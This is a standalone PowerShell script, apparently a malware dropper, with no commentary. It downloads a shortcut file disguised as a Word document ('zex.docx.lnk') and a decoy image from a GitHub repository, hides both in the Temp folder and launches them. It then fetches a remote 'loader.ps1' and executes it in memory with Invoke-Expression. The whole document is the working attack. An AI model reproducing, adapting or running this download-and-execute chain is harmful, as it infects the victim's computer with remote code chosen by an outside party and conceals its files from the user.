$url1 = "https://raw.githubusercontent.com/Cruzalexandar/document/main/zex.docx.lnk"
$url2 = "https://raw.githubusercontent.com/Cruzalexandar/document/aaf3b48fb5c04e73bb3c4b1f5f6f450032c6208e/jeshurun.jpg"
$scriptUrl = "https://raw.githubusercontent.com/Cruzalexandar/document/main/loader.ps1"

# Specify the Temp folder
$tempPath = [System.IO.Path]::GetTempPath()
$filePath1 = Join-Path -Path $tempPath -ChildPath "zex.docx.lnk"
$filePath2 = Join-Path -Path $tempPath -ChildPath "Jeshurun.jpg"

function Check-FilePath {
    param (
        [string]$filePath
    )

    if (Test-Path -Path $filePath) {
        try {
            # Check if the file is in use
            $stream = [System.IO.File]::Open($filePath, 'Open', 'Read', 'Read')
            $stream.Close()
            Remove-Item -Path $filePath -Force
        } catch {
            Write-Error "File '$filePath' is in use or cannot be accessed. Error: $_"
            return $false
        }
    }
    return $true
}

# Download the files
if (Check-FilePath -filePath $filePath1) {
    try {
        Invoke-WebRequest -Uri $url1 -OutFile $filePath1 -ErrorAction Stop
        Set-ItemProperty -Path $filePath1 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
    } catch {
        Write-Error "Failed to download or set properties for file: $filePath1. Error: $_"
    }
}

if (Check-FilePath -filePath $filePath2) {
    try {
        Invoke-WebRequest -Uri $url2 -OutFile $filePath2 -ErrorAction Stop
        Set-ItemProperty -Path $filePath2 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
    } catch {
        Write-Error "Failed to download or set properties for file: $filePath2. Error: $_"
    }
}

# Attempt to start the downloaded files
try {
    Start-Process -FilePath $filePath1
} catch {
    Write-Error "Failed to start process for file: $filePath1. Error: $_"
}

try {
    Start-Process -FilePath $filePath2
} catch {
    Write-Error "Failed to start process for file: $filePath2. Error: $_"
}

# Download the script content
$response = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0

# Check if the download was successful
if ($response.StatusCode -eq 200) {
    $scriptContent = $response.Content

    # Execute the script in memory
    Invoke-Expression -Command $scriptContent
} else {
    Write-Error "Failed to download the script. Status code: $($response.StatusCode)"
}
